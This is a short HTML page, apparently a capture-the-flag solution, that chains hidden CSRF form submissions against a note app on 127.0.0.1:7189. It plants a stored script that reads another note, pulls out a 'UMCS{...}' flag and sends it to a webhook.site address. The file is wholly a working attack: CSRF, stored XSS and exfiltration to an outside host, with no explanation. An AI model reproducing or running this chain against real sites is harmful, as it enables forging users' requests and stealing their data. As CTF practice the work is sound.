<!DOCTYPE html>
<html>
<body>

<!-- Hidden target so tab never leaves our page until the very end -->
<iframe name="x" style="display:none"></iframe>

<!-- ① create malicious note -->
<form id="add" action="http://127.0.0.1:7189/dashboard" method="POST" target="x">
<textarea name="content">
<script>
(async()=>{
  try{
    const r = await fetch('/notes/1');      // flag note
    const t = await r.text();
    const m = t.match(/UMCS\{[^}]+\}/);
    if (m) new Image().src=
      'https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag='+encodeURIComponent(m[0]);
  }catch(e){}
})();
</script>
</textarea>
</form>

<!-- ② switch on “unsafe” mode (id=2 is the note we just added) -->
<form id="unsafe" action="http://127.0.0.1:7189/prefs/unsafe" method="POST" target="x">
  <input name="id"     value="2">
  <input name="enable" value="1">
</form>

<script>
/* fire the CSRFs in sequence, then view the note */
document.getElementById('add'   ).submit();
setTimeout(()=>document.getElementById('unsafe').submit(), 500);
setTimeout(()=>location.href='http://127.0.0.1:7189/notes/2', 1000);
</script>
</body>
</html>
